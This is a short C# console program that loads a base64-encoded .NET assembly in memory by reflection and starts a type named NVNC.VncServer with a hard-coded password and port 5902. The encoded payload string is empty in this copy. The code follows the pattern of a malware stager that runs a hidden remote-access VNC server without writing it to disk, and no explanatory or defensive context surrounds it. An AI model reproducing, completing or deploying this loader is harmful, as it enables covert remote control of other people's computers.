using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Reflection;

namespace ConsoleApplication18
{
    class Program
    {
        static void Main(string[] args)
        {
            string raw = "";
            byte[] buffer = Convert.FromBase64String(raw);
            Assembly assembly = Assembly.Load(buffer);
            Type tp = assembly.GetType("NVNC.VncServer");
            Object obj = Activator.CreateInstance(tp, new object[] { "T!T@N", 5902, "T!T@N-VNC" });
            MethodInfo start = tp.GetMethod("Start");
            start.Invoke(obj, new string[] { });
            Console.ReadLine();
        }
    }
}
